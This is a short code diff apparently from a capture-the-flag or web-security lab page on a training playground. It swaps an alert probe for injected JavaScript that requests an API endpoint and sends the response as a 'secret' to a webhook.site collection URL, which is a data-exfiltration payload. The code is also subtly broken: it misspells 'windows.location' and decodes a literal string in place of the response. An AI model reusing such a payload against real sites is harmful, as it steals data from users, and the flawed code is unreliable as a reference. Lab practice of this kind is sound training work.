@@ -10,7 +10,14 @@
  <p id="flag">    </p>
 <script>
 
- parent.window.location ="javascript:alert(location.href)";
+ var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+  if (this.readyState == 4 && this.status == 200) {
+    windows.location = 'https://webhook.site/1c57ed41-a189-40ca-bd9d-54959635c9a6/?secret='+atob('this.responseText');
+  }
+};
+xhttp.open("GET", "https://playground.cyberjutsu.io/traihekhacnghiet/1/show_api.php", true);
+xhttp.send();
  
 
 </script>
